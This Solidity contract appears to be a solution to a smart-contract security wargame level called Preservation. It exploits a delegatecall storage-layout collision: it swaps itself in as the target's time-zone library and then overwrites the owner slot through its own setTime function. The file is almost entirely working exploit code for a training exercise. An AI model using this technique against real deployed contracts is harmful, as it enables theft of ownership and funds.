// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Preservation.sol";
import "hardhat/console.sol";

contract PreservationAttack {
    // public library contracts
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint256 storedTime;
    // Sets the function signature for delegatecall
    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

    Preservation preservation;

    constructor(Preservation _preservation) public {
        preservation = _preservation;
    }

    function attack() public {
        //set this contract as timeZone1Library
        preservation.setFirstTime(uint256(address(this)));
    }

    function setTime(uint256 _time) public {
        owner = address(uint160(_time));
    }
}
